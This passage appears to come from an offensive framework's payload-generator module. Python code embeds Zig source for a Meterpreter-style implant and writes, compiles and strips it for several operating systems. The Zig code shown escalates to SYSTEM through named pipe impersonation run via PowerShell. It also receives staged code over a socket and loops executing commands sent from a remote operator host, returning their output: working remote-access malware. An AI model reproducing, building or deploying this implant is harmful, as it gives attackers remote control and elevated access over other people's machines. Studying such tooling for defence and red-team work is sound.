        var getsystem_args = ArrayList.Managed([]const u8).init(self.allocator);
        defer getsystem_args.deinit();
        try getsystem_args.append("powershell.exe");
        try getsystem_args.append("-Command");
        try getsystem_args.append(ps_getsystem_cmd);
        
        var getsystem_child = std.process.Child.init(getsystem_args.items, self.allocator);
        getsystem_child.stdout_behavior = .Pipe;
        getsystem_child.stderr_behavior = .Pipe;
        try getsystem_child.spawn();
        
        const getsystem_stdout = if (getsystem_child.stdout) |f| try self.readFromPipe(f) else "";
        defer if (getsystem_stdout.len > 0) self.allocator.free(getsystem_stdout);
        const getsystem_stderr = if (getsystem_child.stderr) |f| try self.readFromPipe(f) else "";
        defer if (getsystem_stderr.len > 0) self.allocator.free(getsystem_stderr);
        
        _ = try getsystem_child.wait();
        
        if (getsystem_stdout.len > 0) {
            if (output.items.len > 0) try output.append('\n');
            try output.appendSlice(getsystem_stdout);
        }
        if (getsystem_stderr.len > 0) {
            if (output.items.len > 0) try output.append('\n');
            try output.appendSlice(getsystem_stderr);
        }
        
        const success = mem.indexOf(u8, getsystem_stdout, "SUCCESS") != null;
        
        if (success) {
            try appendFmt(self.allocator, &output, "\n[*] Successfully obtained SYSTEM privileges\n", .{});
            self.is_root = true;
            self.username = try self.allocator.dupe(u8, "SYSTEM");
        } else {
            try appendFmt(self.allocator, &output, "\n[!] Failed to obtain SYSTEM privileges\n", .{});
            try appendFmt(self.allocator, &output, "[!] Named Pipe Impersonation technique failed\n", .{});
            try appendFmt(self.allocator, &output, "[!] This may require specific Windows configurations\n", .{});
        }
        
        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = if (success) 0 else 1,
            .error_msg = "",
        };
    }

    pub fn receiveStageCode(self: *Self) !void {
        if (self.socket_fd == null) return;
        
        const fd_val = self.socket_fd.?;
        var length_bytes: [4]u8 = undefined;
        var bytes_read: usize = 0;
        
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(fd_val));
            bytes_read = 0;
            while (bytes_read < 4) {
                const n = ws2_32.recv(sock, length_bytes[bytes_read..].ptr, @intCast(4 - bytes_read), 0);
                if (n == ws2_32.SOCKET_ERROR) {
                    const err_code = ws2_32.WSAGetLastError();
                    // WSAETIMEDOUT = 10060, WSAEWOULDBLOCK = 10035
                    if (err_code == .WSAETIMEDOUT or err_code == .WSAEWOULDBLOCK) return;
                    return error.ConnectionFailed;
                }
                if (n == 0) return;
                bytes_read += @intCast(n);
            }
            
            const stage_length = mem.readInt(u32, &length_bytes, .big);
            if (stage_length > 0 and stage_length < 50 * 1024 * 1024) {
                var stage_buf = try self.allocator.alloc(u8, stage_length);
                defer self.allocator.free(stage_buf);
                
                bytes_read = 0;
                while (bytes_read < stage_length) {
                    const recv_n = ws2_32.recv(sock, stage_buf[bytes_read..].ptr, @intCast(stage_length - bytes_read), 0);
                    if (recv_n <= 0) break;
                    bytes_read += @intCast(recv_n);
                }
            }
            
        } else {
            const fd = @as(posix.fd_t, @intCast(fd_val));
            
            const flags = try posix.fcntl(fd, posix.F.GETFL, 0);
            _ = try posix.fcntl(fd, posix.F.SETFL, flags | posix.O.NONBLOCK);
            defer _ = posix.fcntl(fd, posix.F.SETFL, flags) catch {};
            
            bytes_read = 0;
            const n = posix.recv(fd, &length_bytes, 0) catch |err| {
                if (err == error.WouldBlock) return;
                return err;
            };
            if (n < 4) return;
            
            const stage_length = mem.readInt(u32, &length_bytes, .big);
            _ = try posix.fcntl(fd, posix.F.SETFL, flags);
            
            if (stage_length > 0 and stage_length < 50 * 1024 * 1024) {
                var stage_buf = try self.allocator.alloc(u8, stage_length);
                defer self.allocator.free(stage_buf);
                
                bytes_read = 0;
                while (bytes_read < stage_length) {
                    const recv_n = try posix.recv(fd, stage_buf[bytes_read..], 0);
                    if (recv_n == 0) break;
                    bytes_read += recv_n;
                }
            }
        }
    }

    pub fn run(self: *Self) !void {
        try self.connect();
        self.receiveStageCode() catch {};

        while (true) {
            var cmd_parsed = try self.receiveCommand() orelse break;
            defer cmd_parsed.deinit();

            const cmd_obj = cmd_parsed.value();
            if (mem.eql(u8, cmd_obj.command, "exit")) break;

            const result = self.executeCommand(cmd_obj.command, cmd_obj.args, cmd_obj.command_line) catch |err| {
                try self.sendResponse("", 1, @errorName(err));
                continue;
            };
            try self.sendResponse(result.output, result.status, result.error_msg);
            if (result.output.len > 0) self.allocator.free(result.output);
            if (result.error_msg.len > 0) self.allocator.free(result.error_msg);
        }
    }
};

const Command = struct {
    command: []const u8,
    args: []const []const u8,
    command_line: ?[]const u8 = null,
};

// Wrapper to manage command buffer lifetime alongside parsed data
const CommandParsed = struct {
    parsed: json.Parsed(Command),
    buffer: []u8,
    allocator: std.mem.Allocator,
    
    pub fn deinit(self: *CommandParsed) void {
        self.parsed.deinit();
        self.allocator.free(self.buffer);
    }
    
    pub fn value(self: *const CommandParsed) Command {
        return self.parsed.value;
    }
};

const CommandResult = struct {
    output: []const u8,
    status: i32,
    error_msg: []const u8,
};

fn appendFmt(allocator: std.mem.Allocator, list: *ArrayList.Managed(u8), comptime fmt_str: []const u8, args: anytype) !void {
    const s = try std.fmt.allocPrint(allocator, fmt_str, args);
    defer allocator.free(s);
    try list.appendSlice(s);
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try process.argsAlloc(allocator);
    defer process.argsFree(allocator, args);

    const host = if (args.len > 1) args[1] else "127.0.0.1";
    const port = if (args.len > 2) try fmt.parseInt(u16, args[2], 10) else 4444;

    var client = try MeterpreterClient.init(allocator, host, port);
    client.run() catch |err| {
        std.log.err("client run failed: {}", .{err});
    };
}
"""

    def generate(self):
        """Generate the Zig Meterpreter payload"""
        try:
            print_info("Generating Zig Meterpreter payload...")
            print_info(f"Target: {self.target_os}-{self.target_arch}")
            print_info(f"Connect to: {self.lhost}:{self.lport}")
            
            zig_source = self.ZIG_SOURCE_CODE
            
            platform_dir = self._get_platform_dir(self.target_os)
            if self.output_dir:
                output_path = Path(self.output_dir)
            else:
                output_path = Path("output") / "zig_meterpreter" / platform_dir / self.target_arch
            
            output_path.mkdir(parents=True, exist_ok=True)
            src_dir = output_path / "src"
            src_dir.mkdir(parents=True, exist_ok=True)
            output_source = src_dir / "meterpreter.zig"
            with open(output_source, 'w', encoding='utf-8') as f:
                f.write(zig_source)
            
            binary_name = self._get_binary_name(self.target_os)
            binary_path = output_path / binary_name
            
            # Save compilation script
            compile_instructions = self._generate_compile_instructions(str(output_source), str(binary_path))
            compile_script = output_path / "compile.sh"
            with open(compile_script, 'w', encoding='utf-8') as f:
                f.write(compile_instructions)
            
            if os.name != 'nt':
                os.chmod(compile_script, 0o755)
            
            if self.auto_compile:
                print_info("Auto-compiling...")
                if self._compile():
                    print_success("Compilation successful!")
                else:
                    print_warning("Compilation failed, but source files are ready")
            
            return True

        except Exception as e:
            print_error(f"Error generating Zig payload: {e}")
            return None
    
    def _get_platform_dir(self, target_os: str) -> str:
        platform_map = {
            'linux': 'linux', 'windows': 'windows', 'macos': 'mac',
            'freebsd': 'freebsd', 'netbsd': 'netbsd', 'openbsd': 'openbsd', 'dragonfly': 'dragonfly'
        }
        return platform_map.get(target_os.lower(), target_os.lower())
    
    def _get_binary_name(self, target_os: str) -> str:
        return 'meterpreter.exe' if target_os.lower() == 'windows' else 'meterpreter'
    
    def _generate_compile_instructions(self, source_path: str, binary_path: str) -> str:
        target = f"{self.target_os}-{self.target_arch}"
        opt_flag = f"-O{self.optimization}"
        binary_name = os.path.basename(binary_path)
        source_name = os.path.basename(source_path)
        source_dir = os.path.dirname(source_path)
        
        return f"""#!/bin/bash
# Zig Meterpreter Compilation Script
# Target: {target}
# Optimization: {self.optimization}
# Binary: {binary_path}

echo "Compiling Zig Meterpreter for {target}..."
cd "{source_dir}"
binary_name_no_ext=$(basename "{binary_name}" .exe)
zig build-exe {source_name} \\
    -target {target} \\
    {opt_flag} \\
    -fstrip \\
    --name "$binary_name_no_ext"

if [ $? -eq 0 ]; then
    compiled_binary=""
    for name in "{binary_name}" "$binary_name_no_ext" "$binary_name_no_ext.exe"; do
        if [ -f "$name" ]; then
            compiled_binary="$name"
            break
        fi
    done
    if [ -n "$compiled_binary" ]; then
        mv "$compiled_binary" "{binary_path}"
        echo "✓ Compilation successful!"
    else
        echo "✗ Compiled binary not found!"
        exit 1
    fi
else
    echo "✗ Compilation failed!"
    exit 1
fi
"""
    
    def _compile(self) -> bool:
        try:
            platform_dir = self._get_platform_dir(self.target_os)
            output_path = Path(self.output_dir) if self.output_dir else Path("output") / "zig_meterpreter" / platform_dir / self.target_arch
            binary_name = self._get_binary_name(self.target_os)
            binary_path = output_path / binary_name
            source_file = output_path / "src" / "meterpreter.zig"
            
            with open(source_file, 'r', encoding='utf-8') as f:
                zig_source = f.read()
            
            return self.compile_zig(
                source_code=zig_source,
                output_path=str(binary_path),
                target_platform=self.target_os,
                target_arch=self.target_arch,
                optimization=self.optimization,
                strip=True,
                static=True
            )
        except Exception:
            return False
    
    def run(self):
        return self.generate()
